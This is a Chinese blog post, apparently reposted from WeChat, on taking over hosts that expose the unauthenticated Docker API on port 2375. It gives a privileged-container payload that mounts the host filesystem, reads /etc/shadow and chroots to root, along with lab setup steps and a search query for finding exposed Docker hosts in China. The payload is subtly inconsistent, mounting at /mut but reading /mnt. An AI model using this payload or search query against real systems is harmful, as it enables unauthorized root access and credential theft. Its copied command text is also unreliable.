> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X9AmCBmb0dW0mS06ZTKuzg)

**漏洞来源：**

https://twitter.com/ptswarm/status/1338477426276511749/photo/1

```
payload: 
docker -H x.x.x.x:2375 run --rm -it --privileged --net=host -v /:/mut alpine
File Access: cat /mnt/etc/shadow 
RCE: chroot /mnt
```

**原理：**

Docker 提供了远程管理接口。

Docker Daemon 作为守护进程，运行在后台，可以执行发送到管理接口上的 Docker 命令

端口 2375：未加密的 docker socket, 远程 root 无密码访问主机

**复现环境：**

kali

centos

各安装 docker

安装 centos 因为现装的，啥环境都没  

docker 安装：
==========

```
sudo apt -y install curl gnupg2 apt-transport-https software-properties-common ca-certificates
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo "deb [arch=amd64] https://download.docker.com/linux/debian buster stable" | sudo tee  /etc/apt/sources.list.d/docker.list
apt update
apt install docker-ce docker-ce-cli containerd.io
docker version
```

docekr 配置文件：
------------

```
/usr/lib/systemd/system/docker.service
```

开启远程访问连接的 api：
--------------

![](https://mmbiz.qpic.cn/mmbiz_png/8v8SETPnuWlftfZmfeLf7SjK3icbWAjT2oPhdw5Hpv32UmJicSwWIegouRTz4Lx1KBecuZYh65BL7A5shCicA9h0g/640?wx_fmt=png)

```
systemctl daemon-reload
systemctl restart docker
```

验证端口是否开启：
---------

```
netstat -anlp|grep 2375
```

![](https://mmbiz.qpic.cn/mmbiz_png/8v8SETPnuWlftfZmfeLf7SjK3icbWAjT2KxkN3OSHWYkEOP3UOwhicAKkkDrmWibiaZjic5YCgU9ibqjib1wbp0OUiazkw/640?wx_fmt=png)

**nmap 扫描：**  

![](https://mmbiz.qpic.cn/mmbiz_png/8v8SETPnuWlftfZmfeLf7SjK3icbWAjT2guLNbIxa0UIH1icFJU3AbHW7rPMMphGW9klWuuUQHp1uGuVd5Y7jIcw/640?wx_fmt=png)

**kali 执行：**

kail 已经安装 docker 了这就不多说了快下班了~

```
docker -H 192.168.5.135:2375 run --rm -it --privileged --net=host -v /:/mut alpine
```

```
run               =运行
--rm              =用于foreground模式的容器
-it               =指示Docker分配一个与容器的stdin连接的伪TTY；在容器中创建一个交互式bash shell
--privileged      =在启动的容器，可以看到很多host上的设备，并且可以执行mount
--net=host        =加了net=host后会使得创建的容器进入命令行好名称显示为主机的名称而不是一串id
-v                =把宿主机的目录挂载到容器中
alpine            =镜像
```

**结果总结：**

环境一下午复现 2 分钟

![](https://mmbiz.qpic.cn/mmbiz_png/8v8SETPnuWlftfZmfeLf7SjK3icbWAjT2IgUOa6Nm2mxrNmKJPDdXpk8c2gmd8bkPP7XVHOE5scADaUXNkQEUJQ/640?wx_fmt=png)

**实战语法：**

```
port="2375" && protocol == docker && country="CN"
```